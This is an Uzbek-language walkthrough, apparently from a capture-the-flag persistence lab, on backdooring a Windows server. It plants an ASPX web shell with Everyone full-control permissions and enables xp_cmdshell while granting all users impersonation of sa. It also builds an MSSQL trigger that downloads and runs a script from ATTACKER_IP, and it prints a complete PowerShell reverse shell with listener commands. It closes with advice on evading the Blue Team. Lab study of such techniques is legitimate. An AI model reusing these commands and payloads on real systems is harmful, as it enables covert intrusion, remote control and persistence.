## 🔓 Web-serverga backdoor joylashtirish va undan foydalanish (uzb tarjima va izoh)

### 💥 Windows funksiyalaridan foydalanmasdan backdoor o‘rnatish

Agar siz Windows'ning o‘z ichki funktsiyalaridan foydalanishni istamasangiz, tizimda mavjud bo‘lgan boshqa xizmatlar (masalan, web-server yoki MSSQL) orqali ham backdoor (yashirin kirish nuqtasi) joylashtirish mumkin. Bunday xizmatlar orqali avtomatik kod ishga tushirishga ruxsat berilgan bo‘lsa, sizga kerakli narsani amalga oshirish mumkin.

---

## 🐚 Web Shell'dan foydalanish

Web-serverda yashirin kirish uchun eng oddiy yo‘llardan biri bu — **web shell** faylini server katalogiga yuklab qo‘yishdir.

### 📌 Amallar:

1. `shell.aspx` degan ASP.NET web shell faylini yuklab oling.

2. Faylni serverga yuboring va `C:\inetpub\wwwroot\` katalogiga joylashtiring:

   ```cmd
   C:\> move shell.aspx C:\inetpub\wwwroot\
   ```

3. Agar URL orqali `Permission Denied` xatosi chiqqan bo‘lsa, `icacls` buyrug‘i orqali unga **to‘liq ruxsatlar** berib qo‘ying:

   ```cmd
   C:\> icacls shell.aspx /grant Everyone:F
   ```

4. Endi brauzerda quyidagi havola orqali shell'ga murojaat qilishingiz mumkin:

   ```
   http://10.10.88.85/shell.aspx
   ```

### 🎯 Flag olish:

Shell orqali quyidagicha flag olishingiz kerak:

```
C:\flags\flag16.exe
```

🛡️ **Eslatma:** Web kataloglardagi fayl o‘zgarishlari **Blue Team (himoya jamoasi)** tomonidan kuzatiladi, shuning uchun bu usul uzoq muddat yashirin qola olmaydi.

---

## 🧬 MSSQL orqali backdoor o‘rnatish

### 🎯 Maqsad:

* MSSQL serverga maxsus **trigger** (tetik) yaratib, u orqali tizimda buyruqlarni ishga tushuradigan yashirin kanal yaratamiz.

---

### 🛠️ 1. `xp_cmdshell` ni yoqish:

1. `Microsoft SQL Server Management Studio 18` dasturini oching.
2. **Windows Authentication** orqali tizimga kiring (odatda Administrator).
3. **New Query** tugmasini bosib quyidagi buyruqlarni yuboring:

```sql
sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
```

---

### 🔑 2. Foydalanuvchilarga `sa` foydalanuvchisini o‘zlashtirish huquqini berish

```sql
USE master
GRANT IMPERSONATE ON LOGIN::sa TO [Public];
```

Bu orqali har qanday foydalanuvchi `sa` huquqlari bilan buyruq bajarishi mumkin bo‘ladi.

---

### ⚙️ 3. Trigger yaratish

```sql
USE HRDB

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

* Bu trigger `Employees` jadvaliga har safar yangi ma’lumot kiritilganda ishlaydi.
* U Powershell orqali internetdan `.ps1` skriptni yuklab ishga tushiradi.

---

## 💣 `evilscript.ps1` fayl mazmuni (PowerShell Reverse Shell)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4454);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Bu skript:

* Foydalanuvchi (hujumchi) kompyuteriga teskari ulanish (reverse shell) qiladi.
* Hujumchi kompyuterda yozilgan har qanday buyruq serverda bajariladi.

---

### ⚙️ Hujumni boshqarish:

#### 🧪 1. HTTP serverni oching:

```bash
python3 -m http.server 8000
```

#### 🧪 2. Reverse shellni tinglang:

```bash
nc -lvp 4454
```

#### 🧪 3. Web ilovaga xodim qo‘shing (INSERT). Bu triggerni ishga tushiradi.

---

### 🎯 Flag olish:

Reverse shell orqali quyidagicha flagni bajaring:

```
C:\flags\flag17.exe
```

---

## 🧠 Yakuniy eslatmalar:

* **Web shell** — juda oddiy va samarali, ammo oson aniqlanadi.
* **SQL Trigger** — murakkabroq, ammo avtomatlashtirilgan va yashirinroq.
* Har ikki usul ham tizimda ruxsatlar noto‘g‘ri sozlangan bo‘lsa, oson ishlaydi.
* **Blue Team** harakatlaringizni aniqlamasligi uchun **kamroq shovqinli** va **kam o‘zgaruvchan** usullarni tanlang.
